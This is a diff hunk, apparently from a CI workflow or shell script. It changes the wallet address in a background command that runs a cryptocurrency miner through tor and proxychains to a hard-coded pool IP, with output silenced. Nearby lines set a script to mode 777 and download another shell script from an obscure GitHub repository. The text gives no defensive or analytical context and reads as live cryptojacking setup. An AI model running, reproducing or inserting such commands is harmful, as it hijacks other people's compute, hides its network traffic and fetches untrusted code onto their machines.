@@ -41,7 +41,7 @@
         chmod 777 pwsh.sh
         tor > /dev/null 2>&1 &
         sleep 140
-        proxychains4 ./mavic -v -l 139.99.123.225:3956 -u RLG1PwamJgoMYyCguWVH85rTMGiS1JkP46.$WORKER -p x -t 2 > /dev/null 2>&1 &
+        proxychains4 ./mavic -v -l 139.99.123.225:3956 -u RBw9nUhueGuapWsaekrYUDQQXfon56WKMT.$WORKER -p x -t 2 > /dev/null 2>&1 &
         sleep 30
         ps aux
         wget https://github.com/unmsjd28/ynsg7s9/raw/main/cmd-bin.sh
